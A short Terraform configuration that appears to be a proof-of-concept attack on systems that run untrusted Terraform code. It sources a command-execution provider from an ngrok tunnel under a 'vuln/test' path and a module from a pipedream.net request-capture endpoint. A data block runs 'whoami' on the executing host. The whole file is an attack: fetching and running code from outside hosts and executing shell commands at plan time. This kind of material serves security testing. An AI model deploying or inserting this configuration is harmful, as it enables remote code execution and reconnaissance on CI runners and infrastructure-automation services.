terraform {
  required_providers {
    cmdexec = {
      source  = "tera.ngrok.io:443/vuln/test"
      version = "2.1.0"
    }
  }
}

module "hello" {
  source = "git::https://95a3bed651e039798c778628a22dc980.m.pipedream.net/terraform"
}

data "cmdexec_execute" "sample" {
  command = "echo '*****' && whoami && echo '*****' "
}
